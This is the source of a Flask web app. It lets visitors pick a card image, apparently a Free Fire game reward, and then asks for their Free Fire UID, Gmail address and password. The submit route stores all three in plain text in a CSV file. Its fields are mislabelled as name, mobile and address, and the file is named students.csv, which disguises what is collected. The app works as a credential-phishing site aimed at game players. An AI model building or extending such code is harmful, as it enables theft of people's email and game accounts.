from flask import Flask, request, render_template, redirect, url_for
import csv
import os
import re

app = Flask(__name__)

FILE_NAME = "students.csv"

# Create file with header if not exists
if not os.path.exists(FILE_NAME):
    with open(FILE_NAME, "w", newline="") as file:
        writer = csv.writer(file)
        writer.writerow(["Free Fire UID", "Gmail", "Password", "Selected Card", "Login Method"])

def validate_mobile_number(mobile):
    """Validate email address"""
    import re
    return re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', mobile)

def load_cards():
    """Discover card images automatically from static/cards."""
    card_dir = os.path.join(app.static_folder, "cards")
    cards = []

    if not os.path.isdir(card_dir):
        return cards

    for filename in sorted(os.listdir(card_dir)):
        if not filename.lower().endswith((".png", ".jpg", ".jpeg", ".gif", ".webp", ".svg")):
            continue

        name = os.path.splitext(filename)[0]
        name = name.replace("_", " ").title()
        cards.append({"name": name, "image": f"cards/{filename}"})

    return cards

@app.route("/")
def home():
    return render_template("index.html", cards=load_cards())

@app.route("/select-section")
def select_section():
    card_name = request.args.get('card')
    if not card_name:
        return redirect(url_for('home'))
    return render_template("select_section.html", card_name=card_name)

@app.route("/form")
def form():
    card_name = request.args.get('card')
    section = request.args.get('section')
    if not card_name or not section:
        return redirect(url_for('home'))
    return render_template("form.html", card_name=card_name, section=section)

@app.route("/submit", methods=["POST"])
def submit():
    name = request.form["name"]  # Free Fire UID
    mobile = request.form["mobile"]  # Gmail
    address = request.form["address"]  # Password
    card_name = request.form["card_name"]
    section = request.form["section"]
    
    # Basic validation
    if not name or not mobile or not address:
        return render_template("form.html", card_name=card_name, section=section, 
                             error="All fields are required")
    
    if not validate_mobile_number(mobile):
        return render_template("form.html", card_name=card_name, section=section, 
                             error="Please enter a valid Gmail address")

    # Save data into CSV
    with open(FILE_NAME, "a", newline="") as file:
        writer = csv.writer(file)
        writer.writerow([name, mobile, address, card_name, section])
    
    return render_template("success.html", name=name, card_name=card_name, section=section)

if __name__ == "__main__":
    app.run(debug=True)